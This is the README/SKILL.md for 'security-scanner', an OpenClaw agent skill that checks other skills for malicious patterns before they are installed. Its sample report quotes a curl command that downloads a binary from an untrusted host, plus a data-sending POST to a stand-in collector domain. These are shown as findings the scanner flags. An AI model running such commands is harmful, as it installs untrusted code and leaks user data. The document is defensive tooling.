---
name: security-scanner
description: Scans OpenClaw skills for security vulnerabilities and suspicious patterns before installation
author: anikrahman0
version: 1.0.0
tags: [security, scanner, malware-detection, safety, validation]
license: MIT
---

# Security Scanner

## Description

A security-focused skill that analyzes OpenClaw SKILL.md files and skill packages for potential security risks, malicious patterns, and suspicious behaviors. This tool helps protect your system by detecting:

- Hidden external downloads or executables
- Suspicious API calls and endpoints
- Dangerous file system operations
- Obfuscated or encoded commands
- Unusual prerequisite requirements
- Known malicious patterns

**Why this matters:** With 341+ malicious skills recently discovered on ClawHub, this scanner provides an essential security layer before installing any skill.

## Features

- ✅ **Pattern Detection**: Identifies suspicious code patterns and behaviors
- ✅ **Prerequisite Analysis**: Validates required dependencies and downloads
- ✅ **API Endpoint Validation**: Checks for suspicious external connections
- ✅ **File System Auditing**: Detects dangerous file operations
- ✅ **Encoding Detection**: Flags base64, hex, and other obfuscation attempts
- ✅ **Risk Scoring**: Assigns risk levels (LOW, MEDIUM, HIGH, CRITICAL)
- ✅ **Detailed Reports**: Provides clear explanations of findings
- ✅ **Whitelist Support**: Configure trusted domains and patterns

## Prerequisites

- Node.js 18+ (for running the scanner)
- No external API keys required
- No network access needed (works offline)

## Installation

```bash
# Clone or download the skill
git clone https://github.com/anikrahman0/security-skill-scanner.git

# Or install via ClawHub
clawhub install security-skill-scanner
```

## Configuration

Create a `.security-scanner-config.json` in your OpenClaw directory (optional):

```json
{
  "whitelistedDomains": [
    "github.com",
    "api.openai.com",
    "api.anthropic.com",
    "raw.githubusercontent.com"
  ],
  "whitelistedCommands": [
    "npm install",
    "pip install"
  ],
  "strictMode": false
}
```

## Usage

### Scan a SKILL.md file

```
User: "Scan the skill file at ~/Downloads/new-skill/SKILL.md for security issues"
Agent: [Runs security scan and reports findings]
```

### Scan before installation

```
User: "Before installing the email-automation skill, scan it for security risks"
Agent: [Downloads and scans the skill, provides risk assessment]
```

### Batch scan all installed skills

```
User: "Scan all my installed OpenClaw skills for security issues"
Agent: [Scans all skills in ~/.openclaw/skills/ and generates report]
```

## What It Detects

### 🔴 CRITICAL Risks
- Shell command injection attempts
- External executable downloads (curl/wget binaries)
- Suspicious eval() or exec() usage
- Credential harvesting patterns
- Known malware signatures

### 🟠 HIGH Risks
- Unvalidated external API calls
- File system write access to sensitive directories
- Base64 or hex encoded commands
- Requests to unknown domains
- Privilege escalation attempts

### 🟡 MEDIUM Risks
- Extensive file system read access
- Network requests without HTTPS
- Large numbers of dependencies
- Unusual prerequisite requests
- Deprecated or vulnerable packages

### 🟢 LOW Risks
- Minor code quality issues
- Missing error handling
- Incomplete documentation
- Non-critical warnings

## Output Format

```
=== Security Scan Report ===
Skill: email-automation
Scanned: 2024-02-09 14:30:22
Overall Risk: HIGH ⚠️

FINDINGS:
[CRITICAL] External Binary Download Detected
  Location: Line 45 in prerequisites
  Pattern: curl https://unknown-site.com/tool -o /usr/local/bin/helper
  Risk: This downloads and executes an external binary from an untrusted source
  Recommendation: DO NOT INSTALL - Manual verification required

[HIGH] Suspicious API Endpoint
  Location: Line 89 in execute()
  Pattern: POST to http://data-collector.xyz/log
  Risk: Sends data to unknown third-party server
  Recommendation: Review what data is being sent

[MEDIUM] Unencrypted Network Request
  Location: Line 102
  Pattern: HTTP instead of HTTPS
  Risk: Data transmitted without encryption
  Recommendation: Request HTTPS version

SUMMARY:
Total Issues: 3
Critical: 1
High: 1
Medium: 1
Low: 0

RECOMMENDATION: ❌ DO NOT INSTALL
This skill has critical security issues that pose significant risk to your system.
```

## Example Scenarios

### Scenario 1: Clean Skill
```
User: "Scan the weather-checker skill"
Agent: "✅ SAFE - No security issues detected. The skill uses standard API calls
       to api.weatherapi.com with proper HTTPS and no file system access."
```

### Scenario 2: Suspicious Skill
```
User: "Should I install the productivity-helper skill?"
Agent: "⚠️ WARNING - This skill attempts to download an external binary and
       makes requests to an unknown domain. Risk Level: CRITICAL
       Recommendation: DO NOT INSTALL"
```

### Scenario 3: Minor Issues
```
User: "Analyze the note-taker skill"
Agent: "⚠️ CAUTION - Risk Level: LOW
       Found 2 minor issues:
       - Uses HTTP instead of HTTPS for icon download
       - Missing input validation on file paths
       These can likely be fixed. Consider contacting the author."
```

## Security Guarantees

This scanner itself is designed with security in mind:

- ✅ **No Network Access**: Runs completely offline
- ✅ **No External Dependencies**: Pure JavaScript/Node.js
- ✅ **Read-Only**: Never modifies files being scanned
- ✅ **No Telemetry**: Doesn't send data anywhere
- ✅ **Open Source**: All code is auditable
- ✅ **Sandboxed**: Doesn't execute code from scanned skills

## False Positives

The scanner may flag legitimate uses of certain patterns. Common false positives:

- **npm/pip installs**: Legitimate package managers may trigger warnings
- **GitHub URLs**: Raw GitHub content URLs are generally safe
- **Config files**: Skills that write to config files may be flagged
- **Log files**: Creating log files may trigger file system warnings

Use judgment and review flagged items in context.

## Limitations

- Cannot detect zero-day exploits or novel attack vectors
- May miss sophisticated obfuscation techniques
- Requires human judgment for final decision
- Cannot scan encrypted or compiled code
- Pattern-based detection can have false positives

**This tool is a helpful first line of defense, but not a replacement for careful review.**

## Contributing

Found a malicious pattern not detected? Submit an issue or PR with:
- The malicious pattern
- Example skill that uses it
- Suggested detection method

## Roadmap

- [ ] Machine learning-based pattern detection
- [ ] Integration with VirusTotal API (optional)
- [ ] Automatic skill reputation checking
- [ ] Community-sourced malware signatures
- [ ] Browser extension for ClawHub.ai scanning
- [ ] CI/CD integration for skill developers

## Support

- Report issues: https://github.com/anikrahman0/security-skill-scanner/issues
- Suggest improvements: Pull requests welcome
- Security concerns: security@yourdomain.com

## License

MIT License - Free to use, modify, and distribute

## Disclaimer

This tool provides best-effort security scanning but cannot guarantee detection of all malicious code. Always review skills carefully before installation, especially those requiring system-level permissions. The authors are not responsible for any damages resulting from use of this tool or installation of scanned skills.

---

**Remember: If a skill seems too good to be true or requests unusual permissions, it probably is suspicious. When in doubt, don't install it.**
